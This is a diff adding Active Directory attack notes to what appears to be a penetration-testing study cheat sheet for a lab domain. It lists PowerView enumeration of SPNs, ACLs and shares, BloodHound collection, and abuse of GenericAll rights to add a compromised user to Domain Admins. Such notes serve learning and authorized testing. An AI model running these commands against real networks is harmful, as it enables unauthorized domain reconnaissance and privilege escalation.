@@ -424,5 +424,26 @@ ACTIVE DIRECTORY:
             Get-NetSession -ComputerName files04 -Verbose
         PsLoggon:
             .\PsLoggedon.exe \\client74
-            
+        Get IP throu running application:
+            setspn -L iis_service
+            Get-NetUser -SPN | select samaccountname,serviceprincipalname4
+            nslookup.exe <web04.corp.com>
+        ACL Rights:
+            Get-ObjectAcl -Identity stephanie
+            Convert-SidToName <sid>
+            Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+            "SID1","SID2","SID3"..  | Convert-SidToName
+        If compromised user has GenericAll permissions, we can add users to domain:
+            net group "Domain Admins" stephanie /add /domain
+            Get-NetGroup "Management Department" | select member
+            net group "Management Department" stephanie /del /domain
+        Domain Shares Enum:
+            Find-DomainShare
+            Find-DomainShare -CheckShareAccess
+            ls \\dc1.corp.com\sysvol\corp.com\
+
+        BloodHound:
+            download sharphound on compromised windows
+            import-module .\sharphound.ps1
+            Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
             
